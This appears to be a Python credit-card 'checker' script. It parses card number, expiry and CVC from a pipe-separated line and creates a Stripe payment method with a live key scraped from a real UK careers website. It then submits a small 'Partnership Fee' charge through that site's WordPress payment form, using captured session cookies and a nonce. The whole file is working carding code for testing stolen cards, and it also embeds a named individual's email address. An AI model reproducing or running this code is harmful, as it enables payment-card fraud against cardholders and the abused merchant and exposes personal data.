import requests

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:  # Ensure the year format is correct (e.g., 2024 -> 24)
        yy = yy.split("20")[1]

    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=a9eff41d-37b2-4a15-8fb2-eb82de025ee0cdd70f&muid=daf9d98c-74a8-4eab-8ab6-fb1d16f5eafdd2f029&sid=e246c354-2f76-4cb3-8185-b15617983beff8dfdf&payment_user_agent=stripe.js%2F37ee740de7%3B+stripe-js-v3%2F37ee740de7%3B+card-element&referrer=https%3A%2F%2Fwww.tilcareer.co.uk&time_on_page=37627&key=pk_live_51NziTtLlsEDB1rpsX9r2LfRJc2aCSXknSAgNSqeLVCxhpgk2WvHsWUgVm0YN0dSW2HbLlKhPQEQvbk18EUvbthzq00pCCOU6Ky'

    try:
        r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        r1.raise_for_status()  # Raise exception for HTTP errors
    except requests.RequestException as e:
        return f"Error while contacting Stripe API: {e}"

    pm = r1.json()['id']  # Assuming the 'id' is returned from the response

    cookies = {
        'PHPSESSID': 'd8cb2717d9fcffb85ea829f60b47e615',
        '_ga': 'GA1.1.1660906843.1731646831',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_first_add': 'fd%3D2024-11-15%2005%3A00%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tilcareer.co.uk%2Fpayment-portal%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
        'twk_idm_key': 'svuQAaDwjFjfJeYq0o64z',
        'sbjs_current_add': 'fd%3D2024-11-15%2005%3A00%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tilcareer.co.uk%2Fpayment-portal%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tilcareer.co.uk%2Fpayment-portal%2F',
        'TawkConnectionTime': '0',
        '__stripe_mid': 'daf9d98c-74a8-4eab-8ab6-fb1d16f5eafdd2f029',
        '__stripe_sid': 'e246c354-2f76-4cb3-8185-b15617983beff8dfdf',
        '_ga_JVZR99NDBC': 'GS1.1.1731646830.1.1.1731646886.0.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.tilcareer.co.uk',
        'Referer': 'https://www.tilcareer.co.uk/payment-portal/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    params = {
        't': '1731646887931',
    }

    data = {
        'data': f'__fluent_form_embded_post_id=11040&_fluentform_15_fluentformnonce=f57b15a14b&_wp_http_referer=%2Fpayment-portal%2F&names%5Bfirst_name%5D=Khant%20Ti&names%5Blast_name%5D=Kyi&email=tyikyi2552002%40gmail.com&dropdown=Partnership%20Fee&partnership_fee=0.3&payment_method=stripe&item__15__fluent_checkme_=&__stripe_payment_method_id={pm}',
        'action': 'fluentform_submit',
        'form_id': '15',
    }

    r2 = requests.post(
            'https://www.tilcareer.co.uk/wp-admin/admin-ajax.php',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        
    return r2.json()  # Returning the response in JSON format
